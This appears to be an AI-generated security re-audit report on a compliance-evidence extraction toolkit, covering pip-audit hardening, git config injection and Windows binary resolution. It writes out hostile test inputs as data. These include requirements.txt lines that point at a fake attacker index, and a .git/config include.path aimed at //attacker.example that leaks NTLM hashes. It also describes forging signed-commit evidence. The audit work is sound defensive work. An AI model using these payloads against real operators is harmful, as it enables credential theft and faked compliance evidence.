# SAST/DAST Security Scan Report
## LLMComplianceSkill — AI Compliance Evidence Collection Kit

**Report Date**: 2026-10-11
**Auditor**: Post-Commit Audit Skill (Claude Opus 5.5) — independent re-audit
**Commit**: 9cd7272
**Branch**: fix/extractor-hostile-repo-and-evidence
**Version**: 1.4.0
**Audit Type**: POST-FIX re-audit (fix commit 9cd7272 over 304715e)

---

> ### Addendum: follow-up commit 3650b33 (self-verified, not independently re-audited)
>
> After this re-audit, commit 3650b33 addressed the issues the 9cd7272 fix itself introduced:
>
> - **LOW-03 → FIXED.** `gpg.ssh.allowedSignersFile` and `gpg.ssh.revocationFile` are pinned
>   to the operator's global git config (empty if unset), like the signing programs. Test
>   `a scanned repo cannot vouch for its own signatures` failed before the change (actual 1,
>   expected 0) and passes after it. The positive test, which uses an operator-trusted key
>   supplied through `GIT_CONFIG_GLOBAL`, still counts the commit as signed. On this repo,
>   `signedCommits` stays at 10.
> - **MEDIUM-02 → PARTIALLY FIXED, still MEDIUM.** The two trust files plus `mailmap.file`
>   and `mailmap.blob` are now overridden. That removes every vector 9cd7272 added. Test
>   `a repo-configured mailmap.file is not read` failed before the change and passes after
>   it. **`include.path` / `includeIf` remain open**: git cannot turn off config includes
>   with `-c`. A full fix means running git with a controlled `GIT_CONFIG_*` environment
>   or rejecting repos whose `.git/config` contains `[include`.
> - Suite at 3650b33: **166/166 pass** with pip-audit on PATH.
>
> Counts at 3650b33: Critical 0, High 0, Medium 1, Low 3, Info 8. **Verdict: PASS.**

---

## Executive Summary

Commit 9cd7272 claims to fix HIGH-01, MEDIUM-01, INFO-06, INFO-07 and INFO-08 from the
prior report (written at 304715e). This re-audit tried to break each fix rather than
confirm it. All five claimed fixes hold:

- **HIGH-01 is FIXED.** pip-audit 2.10.1 was run with the exact argv the extractor now
  uses (`--format json --disable-pip --no-deps -r FILE`, cwd = the repo) against 16 hostile
  `requirements.txt` variants. These covered editable and plain local paths, VCS URLs,
  `--index-url`, `--extra-index-url`, `-i`, `--find-links`, `-r` and `-c` includes, direct
  references and hashed lines. No `setup.py` marker was written. No request reached a
  logging "attacker index" on 127.0.0.1. No module planted in the cwd was imported.
- **MEDIUM-01 is FIXED.** Every process start in `tools/` now uses an absolute path. A
  `git.exe` planted in the operator's cwd was ignored, and the extractor produced real
  evidence.
- **INFO-06, INFO-07 and INFO-08 are FIXED.** On this repository, `topAiModifiedFiles` is
  populated and `signedCommits` is 10 (it was 0 before the fix). npm now resolves to
  `npm.CMD`, which leads to a `npm-cli.js` started with `process.execPath`. A program named
  in a repo-local `gpg.*program` key is still never run.

The re-audit found five new issues and three new informational items:

- **MEDIUM-02 (new, partly pre-existing).** A hostile repo-local `.git/config` can still
  make git, and now `ssh-keygen`, open a path the repo chooses. That includes Windows UNC
  paths, which send the operator's NTLM credentials to a remote SMB host. The F4 hardening
  covered only keys that run programs, not keys that name paths. `include.path` and
  `mailmap.file` were already exploitable. 9cd7272 adds `gpg.ssh.allowedSignersFile` and
  `gpg.ssh.revocationFile` as new vectors, because `ssh-keygen` now runs.
- **LOW-03 (new, from the INFO-07 fix).** The same repo-local `gpg.ssh.allowedSignersFile`
  can raise `signedCommits` from 0 % to 100 %.
- **LOW-04 (new, from the HIGH-01 fix plus `auditsRun`).** A `-r` include, or path/URL
  entries, hide pinned dependencies from pip-audit. The evidence then reports
  `auditsRun: ["pip"]` with zero vulnerabilities.
- **LOW-05 (new, pre-existing).** When npm resolves to the Volta shim, the scanned repo's
  `package.json` `"volta"` key chooses which Node and npm versions run.

| Severity | Prior Audit (304715e) | This Audit (9cd7272) | Delta |
|----------|----------------------|----------------------|-------|
| Critical | 0                    | 0                    | —     |
| High     | 1                    | 0                    | −1 (HIGH-01 fixed) |
| Medium   | 1                    | 1                    | 0 (MEDIUM-01 fixed, new MEDIUM-02) |
| Low      | 1                    | 4                    | +3 (LOW-02 open, new LOW-03/04/05) |
| Info     | 8                    | 8                    | 0 (INFO-06/07/08 fixed, new INFO-09/10/11) |
| **Total**| **11**               | **13**               | **+2**|

### Prior-finding status

| ID | Prior severity | Status at 9cd7272 |
|---|---|---|
| HIGH-01 pip-audit installs repo requirements (CWE-829) | HIGH | **FIXED** |
| MEDIUM-01 bare `git` in git-evidence.js (CWE-427) | MEDIUM | **FIXED** |
| LOW-02 quadratic YAML comment regex (CWE-1333) | LOW | **STILL OPEN** (not in scope of 9cd7272) |
| INFO-01 pyproject regex ReDoS (CWE-1333) | INFO | **STILL OPEN** |
| INFO-02 PII in evidence JSON (CWE-359) | INFO | **STILL OPEN** (by design, handling note) |
| INFO-03 world-map `innerHTML` and no SRI (CWE-79/353) | INFO | **STILL OPEN** |
| INFO-04 prototype-pollution sink in content-labeling (CWE-1321) | INFO | **STILL OPEN** |
| INFO-05 `autofill.js --locale` unvalidated (CWE-22) | INFO | **STILL OPEN** |
| INFO-06 `diff-tree -- <hash>` empties AI file list (CWE-754) | INFO | **FIXED** |
| INFO-07 blank `gpg.program` zeroes `signedCommits` (CWE-754) | INFO | **FIXED** (the fix opens LOW-03 and widens MEDIUM-02) |
| INFO-08 npm resolves to extensionless shim on Windows (CWE-754) | INFO | **FIXED** (see LOW-05 and INFO-10 for related residue) |

**Overall Result: PASS** (zero CRITICAL/HIGH; one MEDIUM and four LOW open; see Verdict)

Baseline facts for this audit:
- `npm test` without pip-audit on PATH: **164 tests, 163 pass, 0 fail, 1 skipped** (the
  live hostile-`setup.py` pip-audit test skips when pip-audit is absent).
- `npm test` with `D:\tmp\pip-audit-venv\Scripts` prepended to PATH: **164 tests, 164 pass,
  0 fail, 0 skipped**.
- Environment: Node v24.15.0 (Volta), git 2.55.0.windows.5, pip-audit 2.10.1, Windows 11.

---

## Scope and Method

Reviewed: `git show 9cd7272` in full, and the resulting files
`tools/extractors/git-evidence.js`, `tools/extractors/package-evidence.js`,
`tools/extractors/resolve-binary.js`, `tools/extract-evidence.js`,
`tests/regression-sast-2026-10-11.test.js` and `tests/extractor-hardening.test.js`.
The pip-audit 2.10.1 sources were also read, specifically
`pip_audit/_dependency_source/requirement.py` and `pip_requirements_parser.RequirementsFile.from_file`.

Dynamic probing was done in a session scratch directory only:
- Marker-file payloads.
- A logging HTTP server on 127.0.0.1:18765 that stood in for an attacker index or host.
- `hostname.exe` renamed to `git.exe` / `ssh-keygen.exe` / `gpg.exe` as a benign planted binary.
- A throwaway ed25519 key for SSH-signed test commits.
- `//127.0.0.1/C$/…` admin-share paths to show that UNC paths are opened, without
  contacting any remote host.

No third-party host was contacted except PyPI/OSV (by pip-audit itself) and the npm
registry (by the project's own `npm test` npm-audit regression test). No code in the
repository was modified.

---

## Verification of Prior Fixes (in 9cd7272)

### HIGH-01 — FIXED

`package-evidence.js:939-941` `pipAuditArgs()` returns
`['--format','json','--disable-pip','--no-deps','-r', reqFile]`, used at `:962`. pip-audit
is skipped when there is no `requirements.txt` (`:955-960`).

Code path in pip-audit 2.10.1: when `disable_pip` and `no_deps` are both set,
`_collect_from_files` calls `_collect_preresolved_deps` and returns *before* the
`VirtualEnv(...)`/`pip install` branch. `RequirementsFile.from_file` is called with
`include_nested=False`, so `-r`/`-c` includes are never opened. URL, path and editable
requirements become `SkippedDependency` entries.

Hostile `requirements.txt` cases, each run with the extractor's exact argv and cwd = the
case directory. Every case also had `json.py`, `typing_extensions.py` and
`sitecustomize.py` marker modules in the cwd.

| Case | Content | pip-audit result | setup.py ran | Index/URL fetched | cwd module imported |
|---|---|---|---|---|---|
| A | `-e ./local` | skipped "could not deduce package version" | no | — | no |
| B | `./local` | skipped | no | — | no |
| C | `git+http://127.0.0.1:18765/evil.git#egg=evilpkg` | skipped "URL requirements cannot be pinned" | no | no request | no |
| N | `-e git+http://127.0.0.1:18765/evil.git#egg=evilpkg` | skipped | no | no request | no |
| D | `--index-url http://127.0.0.1:18765/simple` + `evilpkg==1.0` | "not found on PyPI" (queried PyPI, not the index) | no | no request | no |
| E | `--extra-index-url …` + `evilpkg==1.0` | same as D | no | no request | no |
| O | `--trusted-host` + `-i …` + pinned with marker | same as D | no | no request | no |
| J | `--find-links http://127.0.0.1:18765/links` + pin | same as D | no | no request | no |
| F | `-r other.txt` (other.txt = `./local`) | `dependencies: []` (include not followed) | no | — | no |
| G | `-c constraints.txt` (= `./local`) + `requests==2.31.0` | audited requests only | no | — | no |
| H | `evilpkg==1.0 @ file:///…/local` | invalid specifier, exit 1, no JSON | no | — | no |
| H2 | `evilpkg @ file:///…/local` | skipped | no | — | no |
| K | `evilpkg @ http://127.0.0.1:18765/evilpkg-1.0.tar.gz` | skipped | no | no request | no |
| L | `./local/evilpkg-1.0.tar.gz` | skipped | no | — | no |
| I | hashed `requests==2.31.0 --hash=…` + `./local --hash=sha256:00` | audited requests, path skipped | no | — | no |
| M | `requests==2.31.0` (control) | 6 vulns found | — | — | no |

Result: the marker directory was empty and the 127.0.0.1 logger received 0 requests.
pip-audit's documented "`-r` ≡ `pip install -r`" behavior no longer applies with these
flags. The code-execution and attacker-fetch path is closed. Residual evidence-integrity
issues from these semantics are reported as **LOW-04**.

### MEDIUM-01 — FIXED

`grep execFileSync|spawn|execFile tools/` finds exactly four exec sites:

| Site | Binary |
|---|---|
| `extract-evidence.js:20` | `process.execPath` |
| `git-evidence.js:134` (`operatorGitConfig`) | `gitBinary()` |
| `git-evidence.js:176` (`git()`) | `gitBinary()` |
| `package-evidence.js:190` (`runTool`) | rejects any non-absolute `file` (`:185`) |

`gitBinary()` (`git-evidence.js:108-114`) uses `resolveBinary('git')` and fails closed.
`resolveBinary` skips relative PATH entries (`resolve-binary.js:30`). No `spawn`/`exec`
with a shell remains. Reproduction: with a renamed `hostname.exe` planted as `git.exe`,
`ssh-keygen.exe` and `gpg.exe` in the cwd, `node git-evidence.js --repo D:\LLMComplianceSkill`
returned real evidence (`signedCommits: 10`, populated `topAiModifiedFiles`).

`operatorGitConfig` (`git-evidence.js:131-144`) runs `git config --global --get <key>` with
cwd `os.tmpdir()`. `--global` reads only `$HOME/.gitconfig` or `GIT_CONFIG_GLOBAL`, which
belong to the operator. The scanned repo cannot reach this call:
- The cwd is not the repo.
- `includeIf "gitdir:"` and `"onbranch:"` conditions in the global file are evaluated
  against the tmpdir context.
- `GIT_DIR`/`GIT_CONFIG*` environment variables are the operator's.
- On POSIX, a `/tmp/.git` planted by another local user is refused by git's
  `safe.directory` ownership check.

Bare-name pins were also tested. With the operator's global `gpg.ssh.program = ssh-keygen`
(a bare name) and an `ssh-keygen.exe` planted in the scanned repo's worktree, Git for
Windows still ran the real `ssh-keygen` (`signedCommits` 3/3). Git's own lookup does not
search the cwd. Falling back to `resolveBinary('ssh-keygen')` returned
`C:\Program Files\Git\usr\bin\ssh-keygen.EXE`, an operator PATH entry, which is safe.

Repo-local program keys were tested in one run. `gpg.program`, `gpg.openpgp.program`,
`gpg.ssh.program`, `gpg.x509.program` and `gpg.ssh.defaultKeyCommand` each pointed to a
marker `.cmd`. The extractor ran none of them. A plain unhardened `git log --format=%G?`
did run the repo's `gpg.ssh.program`, which confirms the probe was valid.
`defaultKeyCommand` is a signing-only key and is never consulted during verification.

**However**, repo-local *path-valued* keys still reach git and `ssh-keygen`. See
MEDIUM-02 and LOW-03.

Remediation item 2 of the prior MEDIUM-01 (a trusted `cwd` in `runExtractor`) was not
applied. Since every binary is now absolute, this is no longer needed for MEDIUM-01.

### INFO-06 — FIXED

`git-evidence.js:507` now passes
`['diff-tree','--no-commit-id','--name-only','-r','--root', hash, '--']`. Every value
pushed to `aiCommitHashes` passes `isHash()` first (`:466-467`, the only push is at
`:479`). `HASH_RE` is `/^[0-9a-f]{7,40}$/i` (`:79`), so a value can never start with `-`.
A full 40-hex string is resolved as an object ID, not a ref. On this repo,
`topAiModifiedFiles` is populated (`tools/autofill.js` 10, `SKILL.md` 9, …).
Related issue: the 40-character cap rejects SHA-256 object IDs (INFO-09).

### INFO-07 — FIXED

Signing programs are pinned to the operator's global value or to the PATH default
(`git-evidence.js:123-155`). If neither exists, the pin is blank, which fails safe.
`signedCommits` on this repo is 10 (it was 0 before). The regression test "a commit with
a valid SSH signature counts as signed" passes. The new attack surface this opens is
reported as LOW-03 and MEDIUM-02.

### INFO-08 — FIXED

`resolve-binary.js:23-26` tries only PATHEXT extensions on win32. Under Volta-launched
Node, `resolveBinary('npm')` returns
`…\Volta\tools\image\npm\12.2.0\bin\npm.CMD`. `resolveNpm` then falls back to
`dirname(process.execPath)\node_modules\npm\bin\npm-cli.js`, which exists, and the
regression test asserts `auditsRun: ['npm']`. Checks for regressions:
- No caller passes a name that includes an extension. `resolveBinary('git.exe')` now
  returns `null` (it found the file before), which is harmless today (INFO-10).
- nvm-windows (`C:\nvm4w\nodejs\npm.cmd` + `node_modules\npm\bin\npm-cli.js`) matches the
  `.cmd` branch.
- A Volta `npm.EXE` shim is returned as-is and run directly. That was also true before
  9cd7272, but it has a repo-influence side effect (LOW-05).

---

## Active Findings

### [MEDIUM-02] Repo-local `.git/config` path keys are not neutralized: git and ssh-keygen open repo-chosen paths, including Windows UNC (NTLM credential leak) — NEW (partly pre-existing; widened by 9cd7272)
**CWE**: CWE-73 (External Control of File Name or Path), impact CWE-200 / CWE-522 (credential hash exposure)
**OWASP**: A05:2021 Security Misconfiguration
**Files**:
- `tools/extractors/git-evidence.js:94-100` (`GIT_HARDENING` lists only program-executing keys)
- `git-evidence.js:123-155` (9cd7272 makes `ssh-keygen` actually run)
- Sinks at `git-evidence.js:695` (`%G?`) and `:867`, `:896`, `:904` (`%aN`/`%aE`/`%cE` honor mailmap)
- Every `git()` call (`include.path`)
**Status**: Open

```js
const GIT_HARDENING = [
  '-c', 'core.fsmonitor=false', '-c', 'core.hooksPath=' + os.devNull,
  '-c', 'diff.external=', '-c', 'protocol.allow=never', '-c', 'log.showSignature=false'
];  // no override for include.path, mailmap.file/blob, gpg.ssh.allowedSignersFile/revocationFile
```

**Description**: The F4 threat model treats a scanned repo's `.git/config` as hostile. The
hardening neutralizes keys that make git *run* a program. It does not neutralize keys that
make git, or a program git starts, *open a path*. On Windows, opening a
`//host/share/…` path makes an SMB connection that authenticates with the operator's
NTLM credentials. That leaks a crackable or relayable NetNTLMv2 hash to the host the repo
names. The WebDAV redirector is a fallback when the WebClient service is running.

Vectors reproduced with `//127.0.0.1/C$/…` (a local admin share, so no remote host was
contacted):

| Repo-local key | Who opens it | Reproduced | Introduced |
|---|---|---|---|
| `include.path=//host/share/x` | git itself, on **every** `git()` call | Included file's `[mailmap] file=` took effect; mapped name appeared in evidence | pre-existing |
| `mailmap.file=//host/share/x` | git (`%aN`/`%aE` in author and committer extraction) | Mapped author `Mapped Via UNC` appeared in evidence JSON | pre-existing |
| `gpg.ssh.allowedSignersFile=//host/share/x` | `ssh-keygen -Y find-principals/verify` during `%G?` | `signedCommits` 0 → 3 when the allowed-signers file was served via the UNC path | **9cd7272** (before it, `gpg.ssh.program=` was blank and ssh-keygen never ran) |
| `gpg.ssh.revocationFile=//host/share/x` | `ssh-keygen` during `%G?` | Same mechanism (a local revocation path changed the result to 0 G) | **9cd7272** |

**Exploit scenario**: An operator is handed a repository as a directory or archive (not a
fresh clone, which would not carry `.git/config`). It contains one SSH-signed commit and
`.git/config` entries such as `include.path = //attacker.example/s/c`. Running
`extract-evidence.js --repo <dir>` on Windows makes git connect to `attacker.example:445`
and send the operator's NetNTLMv2 response. The actual remote NTLM exchange was not
exercised, in line with the no-third-party-host rule. That Windows authenticates to a UNC
SMB target on open is standard OS behavior.

**Preconditions**:
- Windows.
- The repo is delivered with its `.git` directory. This is the same precondition as CS-F4,
  which was rated MEDIUM.
- Outbound SMB (or WebDAV) to the attacker host is allowed.
- For the `gpg.ssh.*` vectors, at least one SSH-signed commit in the scan window, which
  the attacker controls.

**Remediation**:
1. Add path-key overrides to `GIT_HARDENING`:
   - `-c mailmap.file= -c mailmap.blob= -c log.mailmap=false`, and use `%an`/`%ae`/`%cn`/`%ce`.
   - `-c gpg.ssh.allowedSignersFile=<operator global value or os.devNull>`.
   - `-c gpg.ssh.revocationFile=<operator global value or empty>`, both read with
     `operatorGitConfig`.
2. Command-line `-c` cannot stop an `include.path`/`includeIf` that lives inside the repo's
   own config. Before the first git call, read `.git/config` with
   `git config --local --no-includes --list` (or parse it as text). Refuse, or mark the
   evidence `untrusted-config`, when it contains `include.`/`includeIf.` sections or any
   value that starts with `//` or `\\`.
3. Alternatively, scan a private copy that has a clean config:
   - Copy `objects/`, `refs/`, `packed-refs` and `HEAD` into a temp dir and write a fresh
     minimal `config`.
   - Or set `GIT_CONFIG_NOSYSTEM=1` and `GIT_CONFIG_GLOBAL=<operator file>`, and run
     against `--git-dir=<copy>`.
4. Add a hostile-repo test for each key that asserts the UNC path is never opened (for
   example, assert the key is overridden in argv and that evidence is unaffected).

---

### [LOW-02] Quadratic regex in YAML comment stripping (hostile-repo DoS of ci-evidence) — STILL OPEN
**CWE**: CWE-1333
**File**: `tools/extractors/ci-evidence.js:77` (unchanged by 9cd7272)
**Status**: Open

```js
return line.replace(/\s+#.*$/, '');   // O(n^2) on a long whitespace run with no '#'
```

Unchanged from the prior report: measured 10k→25 ms, 20k→93 ms, 40k→384 ms, 80k→1,555 ms.
A ~1 MB line passes the 120 s extractor timeout, and ci-evidence is recorded as `{error}`.
**Remediation**: Use `line.replace(/(^|[ \t])#.*$/, '$1')` or an `indexOf` scan, and cap
per-file size.

---

### [LOW-03] `signedCommits` can be forged by a repo-local `gpg.ssh.allowedSignersFile` — NEW (introduced by the INFO-07 fix)
**CWE**: CWE-345 (Insufficient Verification of Data Authenticity)
**File**: `tools/extractors/git-evidence.js:123-155` (only `*.program` keys are pinned) and `:695-697`
**Status**: Open

```js
const SIGNING_PROGRAMS = [['gpg.program','gpg'], ['gpg.ssh.program','ssh-keygen'], ['gpg.x509.program','gpgsm']];
...
const signed = sigLines.filter(s => s === 'G').length;
```

**Description**: For SSH signatures, `%G?` returns `G` only when the key is listed in
`gpg.ssh.allowedSignersFile`. 9cd7272 pins the verifier program but not its trust
anchor. Because repo-local config takes precedence over global config, the scanned repo
decides which keys count as trusted.

**Verified**: A test repo had 3 commits signed with a throwaway key. With only the
operator's global allowed-signers file, the extractor reported
`signedCommits: 0, signedPercentage: 0` (`%G?` = `U`). After
`git config gpg.ssh.allowedSignersFile .allowed`, where `.allowed` is an in-repo file
listing the attacker's own key, it reported `signedCommits: 3, signedPercentage: 100`.
`gpg.minTrustLevel` is likewise taken from the repo.

The evidence is handed to compliance reviewers as proof of commit signing. Before 9cd7272
the value was always 0, so this forgery path is new. It needs a hostile `.git/config`, as
in MEDIUM-02.

**Remediation**:
- Pin `gpg.ssh.allowedSignersFile` (and `gpg.minTrustLevel`) to the operator's global
  value, or to `os.devNull` when unset.
- Document that `signedCommits` counts signatures trusted by the *operator's* keyring and
  allowed-signers file. An alternative is to report "signature present" (`%G?` ≠ `N`)
  separately from "verified by operator trust".

---

### [LOW-04] pip-audit evidence can claim a clean audit while pinned dependencies are hidden (`-r` include, path, URL or editable entries) — NEW (introduced by 9cd7272)
**CWE**: CWE-754 (Improper Check for Unusual or Exceptional Conditions); evidence fails open
**File**: `tools/extractors/package-evidence.js:928-941` (comment), `:962-980`, `:1155-1158`
**Status**: Open

```js
var deps = Array.isArray(audit) ? audit : (... audit.dependencies ...);
for (...) if (deps[i] && Array.isArray(deps[i].vulns)) counts.moderate += deps[i].vulns.length;
...
if (pipAudit) auditsRun.push('pip');      // pushed even if every dependency was skipped
```

**Description**: With `--disable-pip --no-deps`, pip-audit reads only the top-level file:
- `include_nested=False` means `-r`/`-c` includes are ignored.
- Path, URL and editable lines become `skip_reason` entries with no `vulns`.

`runPipAudit` ignores `skip_reason`, and `extract()` records `auditsRun: ["pip"]`. The new
`auditsRun` field exists to say whether zero vulnerabilities is real evidence, so this
case defeats its purpose.

**Verified with the extractor end to end (pip-audit 2.10.1)**:
- `requirements.txt` = `requests==2.31.0` gives `moderate: 6, auditsRun: ["pip"]`.
- `requirements.txt` = `-r prod.txt`, with `prod.txt` = `requests==2.31.0`, gives
  `moderate: 0, auditsRun: ["pip"]`. The same vulnerable pin is hidden.
- `requests==2.31.0` plus `flask>=2` gives `auditsRun: []`. One unpinned line aborts the
  whole audit.

The new code comment says "Unpinned entries are reported by pip-audit as errors and are
not audited". That understates the effect: a single unpinned line suppresses the audit of
every entry.

**Remediation**:
- Count `dependencies[].skip_reason` entries and record them, for example as
  `vulnerabilities.pipSkipped`. Push `'pip'` to `auditsRun` only when at least one
  dependency was resolved and audited.
- Flag `-r`/`-c` lines as "not audited". Optionally, expand includes yourself with
  `isRepoFile` containment, and write only validated `name==version` lines to a temp file.
- Correct the comment.

---

### [LOW-05] Volta `npm.exe` shim lets the scanned repo's `package.json` choose the Node/npm version npm audit runs with — NEW (pre-existing behavior, first reported)
**CWE**: CWE-15 (External Control of System or Configuration Setting); related CWE-829
**File**: `tools/extractors/package-evidence.js:212-225` (`resolveNpm` returns a `.exe` as-is), `:866` (isolated dir copies `package.json`)
**Status**: Open

```js
var ext = path.extname(npmPath).toLowerCase();
if (ext === '.cmd' || ext === '.bat' || ext === '.ps1') { ... npm-cli.js ... }
return { file: npmPath, prefixArgs: [] };   // C:\Program Files\Volta\npm.EXE (Volta shim)
```

**Description**: Suppose Node is started without Volta, for example
`C:\Program Files\nodejs\node.exe`, while `C:\Program Files\Volta` comes earlier on PATH.
Then `resolveBinary('npm')` returns the Volta shim `npm.EXE`. The shim reads the
`"volta"` key of the `package.json` in its cwd, which is the isolated audit directory
holding the scanned repo's own `package.json`, and runs that toolchain.

**Verified**: In this configuration, an isolated dir with
`{"volta":{"node":"24.15.0","npm":"12.0.2"}}` made the extractor's resolved npm report
`12.0.2`. Changing the pin to `12.2.0` changed the version that ran.

Impact:
- A pin to a version that is not installed makes Volta download and run it. This was not
  exercised, to avoid network access. The download comes from Volta's configured
  distribution source, not from an attacker, so this is not arbitrary code.
- The scanned repo can force an old npm with different audit semantics, or force a
  download.
- `volta.extends` resolves other `package.json` files relative to the temp dir.

This behavior predates 9cd7272: the Volta directory never had an extensionless `npm`.
However, it is the path INFO-08's fix now relies on in this PATH layout.

**Remediation**: For any non-`.js` npm result, prefer
`process.execPath` + `<node dir>/node_modules/npm/bin/npm-cli.js`. Otherwise, set
`VOLTA_BYPASS=1` in `extraEnv` for the npm audit call, or remove the `volta` key from the
copied `package.json`.

---

## Informational Findings

### [INFO-01] ReDoS potential in package-evidence parsers — STILL OPEN
**CWE**: CWE-1333
**File**: `tools/extractors/package-evidence.js:530` (was `:557`. The lines shifted because `resolveBinary` moved out. The code is unchanged.)
```js
var depsMatch = pyText.match(/\[project\][\s\S]*?dependencies\s*=\s*\[([\s\S]*?)\]/);
```
Quadratic in the number of `[project]` occurrences. Fix: use `indexOf` and then parse line by line.

### [INFO-02] PII in evidence JSON output — STILL OPEN (handling note)
**CWE**: CWE-359 / CWE-312
**File**: `tools/extractors/git-evidence.js:867, 896, 904`
Author and committer names and emails go into the evidence and `compliance-config.json`.
Treat these outputs as personal data. Note that `%aN` also honors a repo-controlled
mailmap (MEDIUM-02).

### [INFO-03] World map builds its tooltip with `innerHTML`, and CDN scripts have no SRI — STILL OPEN
**CWE**: CWE-79 (latent), CWE-353 / CWE-829
**Files**: `AI-Regulations-World-Map.html:45-46, 210, 225` (and its two copies)
Unchanged. Fix: build the tooltip with `textContent`/`createElement`, add `integrity` and
`crossorigin`, and pin `world-atlas@2.0.2`.

### [INFO-04] Prototype pollution sink in content-labeling state restore — STILL OPEN
**CWE**: CWE-1321
**File**: `tools/interactive/content-labeling.html:180`
Unchanged. The only source is the tool's own `sessionStorage`. Kept for defense in depth.

### [INFO-05] `autofill.js --locale` is used in paths without validation — STILL OPEN
**CWE**: CWE-22
**File**: `tools/autofill.js:691, 711, 721`
Unchanged. Operator argv only. Apply the i18n locale regex.

### [INFO-06] `diff-tree -- <hash>` — FIXED in 9cd7272
See Verification. `git-evidence.js:507`.

### [INFO-07] Blank `gpg.program` zeroes `signedCommits` — FIXED in 9cd7272
See Verification. The fix introduces LOW-03 and widens MEDIUM-02.

### [INFO-08] npm resolves to the extensionless shim on Windows — FIXED in 9cd7272
See Verification. Related residue is in LOW-05 and INFO-10.

### [INFO-09] `HASH_RE` rejects SHA-256 object IDs, so AI-attribution evidence is always 0 for SHA-256 repositories — NEW (pre-existing since the F1 fix)
**CWE**: CWE-754
**File**: `tools/extractors/git-evidence.js:79`, used at `:466-467`
```js
const HASH_RE = /^[0-9a-f]{7,40}$/i;
```
**Verified**: On a `git init --object-format=sha256` repo with one commit carrying
`Co-Authored-By: Claude <noreply@anthropic.com>`, `%H` is 64 characters. The extractor
reported `aiAttributedCommits: 0`, `aiAttributionPercentage: 0`, `aiToolsDetected: []`
and `topAiModifiedFiles: []`. The commits are counted in the total but are never
classified. This is not exploitable, because the gate still blocks options, but the
evidence fails open. Fix: `/^(?:[0-9a-f]{7,40}|[0-9a-f]{64})$/i`.

### [INFO-10] Binary-resolution residue: Volta npm image layout is missed, and names with an extension no longer resolve — NEW
**CWE**: CWE-754
**Files**: `tools/extractors/package-evidence.js:217`, `tools/extractors/resolve-binary.js:23-26`

There are two issues:
1. In a Volta npm image, `npm-cli.js` sits next to `npm.cmd` (`…\npm\12.2.0\bin\npm-cli.js`),
   not under `bin\node_modules\npm\bin\`. `resolveNpm` therefore misses the operator's
   selected npm (12.2.0) and silently uses the npm bundled with the running Node. The
   audit still runs, but with a different npm than the operator chose.
2. On win32, `resolveBinary('git.exe')` and `resolveBinary('npm.cmd')` now return `null`,
   because only `name + PATHEXT` is tried. No current caller passes an extension, so
   nothing breaks today.

Fix: also check `path.join(dirname(npmPath), 'npm-cli.js')`. In `resolveBinary`, try
`''` when `name` already ends in a PATHEXT extension.

### [INFO-11] `requirements.txt` is not checked with `isRepoFile`, so a symlink can make pip-audit read outside the repository — NEW
**CWE**: CWE-59
**File**: `tools/extractors/package-evidence.js:153-157` (`fileExists` follows symlinks), `:955-962`
This was found by code review and not reproduced. A `requirements.txt` symlink to any
operator-readable file is parsed by pip-audit. Fragments of invalid lines can appear in
pip-audit's stderr, which is not written to evidence. On POSIX, a FIFO makes pip-audit
block until the 60 s timeout, because pip-audit copies FIFO inputs. The impact is small
because evidence keeps only counts. Fix: gate on `isRepoFile()` as 3b9ca56 does for
CHANGELOG, CODEOWNERS and LICENSE.

---

## Areas Reviewed and Found Clean

- **Process execution**: there are 4 exec sites, all argv arrays, all absolute binaries,
  and no `shell: true` (see MEDIUM-01 verification).
  - `runTool` rejects non-absolute files.
  - `process.execPath` is used for the extractors and for `npm-cli.js`.
  - `pip-audit.exe` started with cwd = the repo does not put the cwd on `sys.path`. Marker
    `json.py`, `typing_extensions.py` and `sitecustomize.py` files planted there were
    never imported.
- **Signing-program pinning**: repo-local `gpg.program`, `gpg.openpgp.program`,
  `gpg.ssh.program`, `gpg.x509.program` and `gpg.ssh.defaultKeyCommand` are not run. An
  operator global bare-name value is not resolved from the repo worktree.
  `operatorGitConfig` cannot be influenced by the scanned repo.
- **git argv injection**: every repo-derived value is `isHash`-gated. `--grep=` is a single
  argv entry. `since` is derived from an integer.
- **package-evidence `runGit`** (`:231-240`) runs only `ls-files --error-unmatch -- <rel>`.
  It does not verify signatures or read mailmap, and it carries the fsmonitor, hooksPath
  and protocol hardening.
- **New test file** `tests/regression-sast-2026-10-11.test.js`: it checks both the blocked
  attack and the evidence value for each fix. The live hostile-`setup.py` test is skipped
  without pip-audit. CI therefore exercises it only if pip-audit is installed there.
- **Dynamic code, deserialization, interactive tools, CI workflow, dependencies and
  secrets**: unchanged since the prior audit and still clean. 9cd7272 touches none of
  these files.

---

## DAST Assessment

There are no server components, and 9cd7272 changes no browser-facing file. The prior
assessment stands: `tools/interactive/` is clean, and the world map has one INFO item
(INFO-03).

---

## Verdict

**PASS — 0 CRITICAL, 0 HIGH, 1 MEDIUM, 4 LOW, 8 INFO.**

9cd7272 closes the HIGH code-execution path (HIGH-01) and the MEDIUM binary-planting path
(MEDIUM-01). Both held up against adversarial probing. The three evidence regressions
(INFO-06/07/08) are also fixed and covered by regression tests. Test results: 163/164 pass
with 1 skip without pip-audit, and 164/164 pass with it.

The PASS is conditional on tracking the following:
1. **MEDIUM-02**: repo-local `include.path`, `mailmap.file` and (new in 9cd7272)
   `gpg.ssh.allowedSignersFile`/`revocationFile` let a hostile `.git/config` make git or
   `ssh-keygen` open a UNC path on Windows. Fix this in the next hardening pass.
2. **LOW-03 and LOW-04** let a hostile repo inflate its signed-commit percentage, or hide
   its vulnerable Python pins behind a `-r` include, while the evidence still looks clean.
   Fix both before the evidence is relied on for untrusted repositories, because they
   undercut the `auditsRun` and `signedCommits` fields that 9cd7272 set out to make
   trustworthy.

---

_Report generated by post-commit-audit skill (Step 1: SAST/DAST), independent re-audit, 2026-10-11_
